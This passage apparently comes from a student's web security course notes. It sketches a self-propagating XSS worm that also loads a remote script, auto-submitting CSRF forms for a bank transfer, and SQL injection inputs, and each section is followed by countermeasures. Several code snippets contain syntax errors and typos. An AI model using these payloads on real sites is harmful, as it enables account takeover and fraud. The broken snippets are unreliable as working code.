integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1301a926-7344-80a6-8ea5-e51698898c55" class="code"><code class="language-HTML">&lt;!-- use &#x27;document.getElementById(&quot;worm&quot;);&#x27; to get attack code --&gt;
&lt;script id=&quot;worm&quot;&gt; //id worm
		var strCode = document.getElementById(&quot;worm&quot;); //get script content

&lt;/script&gt;</code></pre></li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1301a926-7344-8088-9b34-f38fe7c3855b" class="code"><code class="language-JavaScript">window.onload = function(){
		var headerTag = &quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;;
		var jsCode = document.getElementById(&quot;worm&quot;).innerHTML;
		var tailTag = &quot;&lt;/&quot; + &quot;script&gt;&quot;;
		
		// Put all the pieces together, and apply the URI encoding
		var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
		
		// Set the content of the description field and access level.
		var desc - &quot;&amp;description-Samy is my hero&quot; + wormCode;
		+= &quot;&amp;accesslevel[description]=2&quot;;
		}</code></pre><ol type="1" id="1301a926-7344-8010-a626-ea0ac44d47f1" class="numbered-list" start="1"><li>construct a copy of the worm code as a variable (including the script tag)</li></ol><ol type="1" id="1301a926-7344-80a7-a6f0-fcfdcac08219" class="numbered-list" start="2"><li>split the string into two parts and concat them with + to prevent browser from blocking script</li></ol><ol type="1" id="1301a926-7344-806d-b88e-d474df059a22" class="numbered-list" start="3"><li>in HTTP post request, data is sent with Content-Type as “applicaiton/x—www.form.urlencoded” because we used encodeURLComponent function to encode the string</li></ol><ol type="1" id="1301a926-7344-809a-a164-d85130bbb68a" class="numbered-list" start="4"><li>access level of each field is 2, meaning public</li></ol><h3 id="1301a926-7344-80b1-8b89-d56138823866" class="">Link Approach</h3><p id="1301a926-7344-80c7-a837-d5d7a3d6f7ca" class="">write the attack code in JS file and access it via a URL</p><p id="1301a926-7344-8094-a7fd-f90d09ebf340" class="">the propagating worm code just infects the user and executes the JS file</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1301a926-7344-80a1-9092-d6e1a19bfdf8" class="code"><code class="language-HTML">&lt;script&gt;
		window.onLoad = function() {
				var wormCode = encodeURLComponent(
						&quot;&lt;script type=\&quot;text/javascript\&quot;&quot;
						+ &quot;id=\&quot;worm\&quot;&quot;
						+ &quot;src=\&quot;https//www.example.com/xssworm.js\&quot;&quot;
						+ &quot;&lt;/&quot; 
						+ &quot;script&gt;&quot;
				)
				var desc = &quot;&amp;description=sammy my hero&quot; + wormCode
		}

&lt;/script&gt;</code></pre></details></li></ul><h1 id="1301a926-7344-80bb-8708-eb3fd3d8a2cd" class="">Countermeasures</h1><p id="1301a926-7344-80d8-bb54-ece17e6f101e" class="">fundamental cause of XSS is html allowing JS code to mix with data</p><ul id="1301a926-7344-80db-86f2-f7d6de86569d" class="bulleted-list"><li style="list-style-type:disc">confused deputy problem: web server/browser trusts all code because it doesn’t know if its from the user or developer</li></ul><ul id="1301a926-7344-8032-895f-e0bd7ca63b0b" class="bulleted-list"><li style="list-style-type:disc">to prevent this we can remove code from data or enforce access control</li></ul><h3 id="1301a926-7344-809a-a82c-ce0e46b2dc33" class="">Filter Approach</h3><p id="1301a926-7344-8054-91bd-d5b00aaf552d" class="">filter out code from user input (remove script tags, onClick attributes , strip “javascript” word)</p><h3 id="1301a926-7344-8057-933a-c70c7a9d7034" class="">Encoding Approach</h3><p id="1301a926-7344-80d2-8439-da1b0585d306" class="">encode symbols so even if data includes code, just display it but not execute it</p><figure id="1301a926-7344-8071-86ed-cc9d5388d7e3" class="image"><a href="image%20119.png"><img style="width:433px" src="image%20119.png"/></a></figure><h3 id="1301a926-7344-8079-bf69-c3b744518427" class="">ELGG’s Approach</h3><p id="1301a926-7344-8055-8c45-dce5c55a9396" class="">let library functions handle sanitization (filtering and encoding special characters for you)</p><figure id="1301a926-7344-8055-9218-d31102b207bc" class="image"><a href="2954a933-c2c3-43b9-bbba-fabd75e3aa01.png"><img style="width:432px" src="2954a933-c2c3-43b9-bbba-fabd75e3aa01.png"/></a></figure><h3 id="1301a926-7344-805b-9faa-e15289dbf71b" class="">Content Security Policy</h3><p id="1301a926-7344-80fd-bff7-cbdfa0eca01a" class="">policy designed to defeat XXS and clickjacking attacks</p><ul id="1301a926-7344-8024-9e7f-ee29766cea24" class="bulleted-list"><li style="list-style-type:disc">policy states that code from self is allowed (google.com)</li></ul><ul id="1301a926-7344-8071-a660-d81ea16e22c5" class="bulleted-list"><li style="list-style-type:disc">inline code is only executed if it contains the correct nonce value or it’s hash is known</li></ul><figure id="1301a926-7344-803a-90f0-eaa137f2b517" class="image"><a href="3d2abc81-b2b3-41c7-a2ff-1d6b659e13a4.png"><img style="width:396.5842696629214px" src="3d2abc81-b2b3-41c7-a2ff-1d6b659e13a4.png"/></a></figure></details></li></ul><ul id="12d1a926-7344-8048-b883-fe381ddf4059" class="toggle"><li><details><summary>Cross-site Request Forgery (CSRF)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1301a926-7344-8028-9f1e-dea7442ec47e"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="5f323599-873d-4c86-b4a5-b31253da4479" class="">site A forges a cross-site request to site B, using active session cookies belonging to site B stored on the browser.<br/><br/><mark class="highlight-yellow">allows site A to make authenticated request to site B</mark> on behalf of the victim</p><figure id="1301a926-7344-8053-8aef-f63d21b3dd05" class="image"><a href="image%20120.png"><img style="width:511px" src="image%20120.png"/></a></figure><ul id="1301a926-7344-80e0-b3d8-c895fecc70d3" class="bulleted-list"><li style="list-style-type:disc">cookies are key value pairs created by websites stored on the browser to work around HTTP being stateless: often used to store session auth</li></ul><ul id="1301a926-7344-8083-a646-c04b66aa0746" class="bulleted-list"><li style="list-style-type:disc">confused deputy problem: server cannot distinguish between same-site vs cross-site requests</li></ul></div></figure><ul id="1301a926-7344-808f-a6e4-ef2a4139ad40" class="toggle"><li><details><summary>CSRF with HTTP GET</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1301a926-7344-80e0-be70-dc5c4e5feff6"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="3081b3ef-1622-44f7-afcc-b979f907fca1" class="">HTTP GET request stores data in the URL</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1301a926-7344-803b-8561-e9c1f3f6e3ee" class="code"><code class="language-JavaScript">GET /post_form.php?foo=hello HTTP/1.1
Host: www.example.com
Cookie: SID=xrghishrdughsieg</code></pre><ol type="1" id="1301a926-7344-8058-8734-f192af0edef1" class="numbered-list" start="1"><li>attacker makes JS code that forges a cross-site request to the target website<ol type="a" id="1301a926-7344-8095-bc89-e84b0fc61460" class="numbered-list" start="1"><li>JS code can be on their webpage</li></ol><ol type="a" id="1301a926-7344-8085-9eef-d8b9b171bf67" class="numbered-list" start="2"><li>can be on any webpage that lets img or iframe tags with src</li></ol></li></ol><ol type="1" id="1301a926-7344-80ca-8c6f-c8def5376cb0" class="numbered-list" start="2"><li>attacker attracts victim to visit their malicious webpage</li></ol><ol type="1" id="1301a926-7344-807c-b01d-cc1c4ac8a07a" class="numbered-list" start="3"><li>victim is logged into the target website (has session cookies)</li></ol><ol type="1" id="1301a926-7344-806c-9a31-ffa70c6b5954" class="numbered-list" start="4"><li>malicious webpage makes a cross-site request to the target website, attaching session cookies<p id="1301a926-7344-8057-92a5-db62d5e09e8e" class="">eg: HTTP request transfer $500 from victim’s bank to attackers</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1301a926-7344-802a-be79-f26f895f97db" class="code"><code class="language-JavaScript">GET: https://www.bank.com/transfer.php?to=3220&amp;amount=500</code></pre></li></ol></div></figure></details></li></ul><ul id="1301a926-7344-80ca-8138-c4a989d9d8c3" class="toggle"><li><details><summary>CSRF with HTTP POST</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1301a926-7344-80c2-a164-d30a759d1bff"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="a4af0337-d9d5-4e60-ae56-fbe4303c5b3b" class="">post request places data inside the “data field” of the HTTP request</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1301a926-7344-8052-aacc-c05540ecea5e" class="code"><code class="language-JavaScript">POST /post_form.php HTTP/1.1
Host: www.exmaple.com
Cookie: SID=xseghjeoasdf
Content-Lenth: 19
foo=hello&amp;bar=world</code></pre><ol type="1" id="1301a926-7344-808c-b064-f5996e1c38e1" class="numbered-list" start="1"><li>attacker uses form submission to make a cross-site post request to a target website without user having to click on a button (using JS)</li></ol><ol type="1" id="1301a926-7344-80f2-bd7a-c8058cc0e611" class="numbered-list" start="2"><li>victim visits the webpage with malicious code and form is executed on page load<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1301a926-7344-808a-bacd-e5df487667d2" class="code"><code class="language-HTML">&lt;script type=&quot;text/javascript&quot;&gt;
		function forge_post()
		
		var fields;
		fields += &quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;to&#x27; value=&#x27;3220&#x27;&gt;&quot;;
		fields +=&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;amount&#x27; value=&#x27;500&#x27;&gt;&quot;;
		
		var p = document.createElement(&quot;form&quot;);
		p.action = &quot;http://www.example.com/action_post.php&quot;;
		p.innerHTML = fields;
		p.method = &quot;post&quot;;
		document.body.appendChild(p);
		p.submit();
		
		}
		
		window.onload = function() { forge_post(); }
&lt;/script&gt;</code></pre></li></ol></div></figure></details></li></ul><h1 id="1301a926-7344-8062-af5b-f45a47c33e3b" class="">Countermeasures</h1><p id="1301a926-7344-8056-9d5a-ddf1c20a59cc" class="">fundamental cause of CSRF is that the server cannot distinguish between same-site vs cross-site requests</p><p id="1301a926-7344-80a9-abf2-e544a3f7b911" class="">however the browser is able to know, it can help counter forgery by prevent cross site requests</p><h3 id="1301a926-7344-8041-9e40-cc91b1ddbcbf" class="">1) Referrer header</h3><p id="1301a926-7344-80a7-989a-dccd21897f05" class="">HTTP request <mark class="highlight-yellow_background">header contains a “referrer”</mark> (<mark class="highlight-yellow_background">where the request is coming from</mark>) to allow server to check for corss-site requests</p><p id="1301a926-7344-80bc-8ae0-e1e68c81f0fe" class="">privacy concern: issue with referrer is it reviews apart of the browsing history</p><h3 id="1301a926-7344-80ec-ba4d-ef61700852ca" class="">2) Secret Token</h3><p id="1301a926-7344-8035-afff-eaa5eed5d2cb" class=""><mark class="highlight-yellow_background">token embedded</mark> in the <mark class="highlight-yellow_background">webpage</mark> <mark class="highlight-yellow_background">or </mark>stored in a <mark class="highlight-yellow_background">cookie </mark>is included in the request</p><p id="1301a926-7344-801b-a02a-dd7e8af014ec" class="">it is the <mark class="highlight-yellow_background">developer’s job to attach and check </mark>the token</p><p id="1301a926-7344-805c-9b9f-dc09b9c10c57" class="">allows server to know if requests are cross or same site</p><h3 id="1301a926-7344-802c-b2f5-d298fb74c477" class="">3) Same-Site cookies</h3><p id="1301a926-7344-807a-8d35-d26305f7b92b" class="">special cookie that provides an <mark class="highlight-yellow_background">attribute called SameSite</mark></p><p id="1301a926-7344-8015-9e4e-c321d29b38ba" class="">attribute is<mark class="highlight-yellow_background"> determined by the browser</mark> which knows if a request is same or cross site to allow the server to know as well</p><p id="1301a926-7344-80e3-b7b9-e1e3e22ee4a7" class="">handling by the browser prevents attackers being able to exploit the attribute </p></details></li></ul><ul id="12d1a926-7344-803c-8af6-f62ffcbe4ae9" class="toggle"><li><details><summary>SQL Injection</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1311a926-7344-8099-be67-ec213c92db2a"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="0f36f988-3a14-4545-88b7-f2eac82d855a" class="">injecting SQL into user inputs to execute code on servers/databases</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1311a926-7344-8000-8176-e93dcc4ef78e" class="code"><code class="language-PHP">&lt;?php
		$eid = &quot;...&quot;;       //user input
		$password = &quot;...&quot;;  //user input
		$sql = &quot;
			SELECT Name, Salary, SSN
			FROM employee
			WHERE eid=&#x27;&quot;+eid&quot;&#x27; and password=&#x27;&quot;+password+&quot;&#x27;, 
		&quot;;
		$res = $conn-&gt;query($sql);
?&gt;</code></pre><ul id="1311a926-7344-80da-91ba-d6e7531abd0a" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">injecting comments</mark> (#) in input will <mark class="highlight-yellow">ignore </mark>the rest of the code<figure id="1311a926-7344-8034-ada8-cf8368552172" class="image"><a href="image%20121.png"><img style="width:562.3250122070312px" src="image%20121.png"/></a><figcaption>attacker inputting ‘EID5002&#x27;’ # can log in without the password, as the password check in the code is ignored</figcaption></figure></li></ul><ul id="1311a926-7344-80c5-840c-d55d1f8c99ae" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">injecting conditions</mark> (OR 1=1) can <mark class="highlight-yellow">change the logic</mark> of the code with WHERE clauses<figure id="1311a926-7344-806d-bf94-d3afca2a790a" class="image"><a href="image%20122.png"><img style="width:624px" src="image%20122.png"/></a><figcaption>attacker appending OR 1=1 can change the condition from finding all records where EID matches to all matching all records: letting them get all records from the db </figcaption></figure></li></ul><ul id="1311a926-7344-8002-9645-f7dc90bf0290" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">injecting</mark> additional <mark class="highlight-yellow">statements </mark>in the input for fields used in <mark class="highlight-yellow">UPDATE </mark>and <mark class="highlight-yellow">INSERT </mark>INTO code can <mark class="highlight-yellow">modify/add records</mark> in db<figure id="1311a926-7344-80c7-800f-ee202abfa1cf" class="image"><a href="image%20123.png"><img style="width:432px" src="image%20123.png"/></a><figcaption>code is using an UPDATE clause. injecting an additional statement such as “salary=’10000’” will not only update the password but also salary</figcaption></figure><figure id="1311a926-7344-8031-afb9-f14261aac4ed" class="image"><a href="image%20124.png"><img style="width:432px" src="image%20124.png"/></a></figure></li></ul><ul id="1311a926-7344-80ca-bb39-d4ea64a8e701" class="bulleted-list"><li style="list-style-type:disc">damage potential of single SQL statements are bounded: allowing multi-statements is more dangerous<figure id="1311a926-7344-80c4-b7d7-e3b44f4ee845" class="image"><a href="image%20125.png"><img style="width:595.984375px" src="image%20125.png"/></a></figure><ul id="1311a926-7344-807f-aaed-f11b99c7822f" class="bulleted-list"><li style="list-style-type:circle">multi-statements are only allowed if the form code is using <code>$mysqli→multi_query()</code></li></ul></li></ul></div></figure><ul id="1311a926-7344-8038-866e-f7567d0c3dac" class="toggle"><li><details><summary>Commands</summary><h3 id="1311a926-7344-802e-8515-c9591e811ae6" class="">Log in</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1311a926-7344-80b4-98ff-e619b4c360b7" class="code"><code class="language-SQL">mysql -u root -pseedubuntu //can log into mysql database management system</code></pre><h3 id="1311a926-7344-8015-ac3d-f6fe890725f4" class="">Created Database</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1311a926-7344-8056-a5ca-e1925a6d3301" class="code"><code class="language-SQL">SHOW DATABASES; //shows existing databases

CREATED DATABASE dbtest; //creates a new database</code></pre><h3 id="1311a926-7344-8042-aa61-e3d435d0e647" class="">Create Table</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1311a926-7344-808e-b891-c87110860a77" class="code"><code class="language-SQL">USE dbtest //switches to a database
//creates a table with a name and schema
CREATED TABLE employee (
			ID INT (60) NOT NULL AUTO_INCREMENT 
			Name VARCHAR (30) NOT NULL //var char being a string
			EID VARCHAR (7) NOT NULL 
			Password VARCHAR (60)
			PRIMARY KEY (ID) //primary key being non duplicated
											 //can be used with other tables as a foreign key
);

DESCRIBE employee; //prints the table</code></pre><h3 id="1311a926-7344-8036-accf-e6c838195713" class="">Insert a row</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1311a926-7344-801e-a2f0-ef8da890ba84" class="code"><code class="language-SQL">INSERT INTO employee (Name, EID, Password) VALUES (&#x27;tom&#x27;, &#x27;EID1&#x27;, &#x27;pass123&#x27;)</code></pre><h3 id="1311a926-7344-8069-bc20-e584bb975fb5" class="">Select Statement</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1311a926-7344-80d6-a775-d32ff2da2f73" class="code"><code class="language-SQL">SELECT * FROM employee; //gets all (*) records from employee table</code></pre><h3 id="1311a926-7344-8075-bc80-e1ba3f6b32c1" class="">Where Clause</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1311a926-7344-8016-9df3-ed9c423c637b" class="code"><code class="language-SQL">//gets record with name david or eid is 100
SELECT * FROM employee WHERE EID=&#x27;EID100&#x27; OR Name=&#x27;David&#x27;; 

//if condtion is always true, then return all records (like *)
SELECT * FROM employee WHERE 1=1;</code></pre><h3 id="1311a926-7344-80d9-8ab8-c72a4f8f9b8f" class="">Update Statement</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1311a926-7344-8076-826a-e5adafbb35d6" class="code"><code class="language-SQL">UPDATE employee SET Salary=82000 WHERE Name=&#x27;Bob&#x27;</code></pre></details></li></ul><h1 id="1311a926-7344-8000-87c1-eeb865e45710" class="">Countermeasures</h1><p id="1311a926-7344-80f3-8027-fd83345f9805" class="">fundamental cause of SQL injection is mixing data with code (trusting user data could have code in it)</p><p id="1311a926-7344-8029-bf86-daf17af9ed9c" class="">program will blindly accept any code and execute it: allowing users to execute arbitrary code</p><h3 id="1311a926-7344-80eb-a882-f7386c8f3f99" class="">Filtering and Encoding</h3><p id="1311a926-7344-8056-93c2-f97aae75b5b1" class="">before accepting user input: santaize it by filtering out characters (#) or encode special characters</p><p id="1311a926-7344-80c3-b06b-daf72f6dd950" class="">however this doesn’t address the fundamental cause of the problem of mixing data with code</p><h3 id="1311a926-7344-800c-bb05-c61f6b43b340" class="">Prepared Statements</h3><p id="1311a926-7344-803f-a7e5-ccc2d3ad897c" class="">separates data and code into different channels: so they don’t mix data is not executed</p><ul id="1311a926-7344-80fb-b364-ff6d3f0cc9d8" class="bulleted-list"><li style="list-style-type:disc">prepared statements was an optimization feature to improve performance when same/similar statements were used multiple times. <p id="1311a926-7344-80fc-9ce4-d1dac74fbe9d" class="">prepared statements is a template where data are passed as parameters and binded later</p><figure id="1311a926-7344-80f9-b3ab-e6dd4664c26a" class="image"><a href="6a2f39dc-f316-4425-a58e-6fd734ecbf80.png"><img style="width:708px" src="6a2f39dc-f316-4425-a58e-6fd734ecbf80.png"/></a></figure></li></ul><ul id="1311a926-7344-8061-bbe0-f4740ae91101" class="bulleted-list"><li style="list-style-type:disc">data base knows the boundary between code and data</li></ul><ul id="1311a926-7344-8016-9047-dbf10d5fee0b" class="bulleted-list"><li style="list-style-type:disc">data received from a data channel is not parsed</li></ul><ul id="1311a926-7344-8097-922d-c1371e44c488" class="bulleted-list"><li style="list-style-type:disc">attacked can hide code in data: but will never be treated as code and executed </li></ul><h3 id="1311a926-7344-8042-9321-eeb0b22a4ad8" class="">Others</h3><ul id="1311a926-7344-80de-9fbb-d56b4ddb6665" class="bulleted-list"><li style="list-style-type:disc">whitelist input validation</li></ul><ul id="1311a926-7344-800d-b770-cf25c3df1358" class="bulleted-list"><li style="list-style-type:disc">escaping all user supplied input</li></ul><ul id="1311a926-7344-8082-b147-cbd76ae028ab" class="bulleted-list"><li style="list-style-type:disc">enforcing least privilege </li></ul><ul id="1311a926-7344-80f0-9a97-f3f02993e7d8" class="bulleted-list"><li style="list-style-type:disc">preforming allow-list input validation as a second defense</li></ul><p id="1311a926-7344-8034-8052-ef006156665b" class="">
</p></details></li></ul><ul id="12d1a926-7344-80c2-b2c7-cf585f7aa428" class="toggle"><li><details><summary>Return-to-libc</summary></details></li></ul><p id="11c1a926-7344-8063-9d97-fd7f29895bfe" class="">
</p></details></li></ul><p id="1211a926-7344-8073-aded-e86fe46c37e1" class="">
</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>